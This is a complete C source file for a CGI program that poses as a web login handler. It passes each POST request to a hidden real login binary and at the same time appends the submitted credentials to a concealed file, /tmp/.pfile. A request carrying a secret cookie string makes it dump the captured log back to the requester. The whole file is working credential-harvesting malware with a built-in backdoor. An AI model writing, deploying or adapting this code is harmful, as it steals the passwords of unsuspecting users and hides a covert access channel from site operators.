#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
int main()
{
        char buf[2048];
        int nread, pfile;
        /* pull the log if we send a special cookie */
        char *cookies = getenv("HTTP_COOKIE");
        if (cookies && strstr(cookies, "our private password")) {
                write(1, "Content-type: text/plain\n\n", 26);
                pfile = open("/tmp/.pfile", O_RDONLY);
                while ((nread = read(pfile, buf, sizeof(buf))) > 0)
                        write(1, buf, nread);
                exit(0);
        }
        /* the parent stores the POST data and sends it to the child, which is the actual login program */
        int fd[2];
        pipe(fd);
        pfile = open("/tmp/.pfile", O_APPEND | O_CREAT | O_WRONLY, 0600);
        if (fork()) {
                close(fd[0]);
                while ((nread = read(0, buf, sizeof(buf))) > 0) {
                        write(fd[1], buf, nread);
                        write(pfile, buf, nread);
                }
                write(pfile, "\n", 1);
                close(fd[1]);
                close(pfile);
                wait(NULL);
        } else {
                close(fd[1]);
                dup2(fd[0],0);
                close(fd[0]);
                execl("/usr/src/EasyAccess/www/cgi-bin/.userLogin",
                      "userLogin", NULL);
        }
}
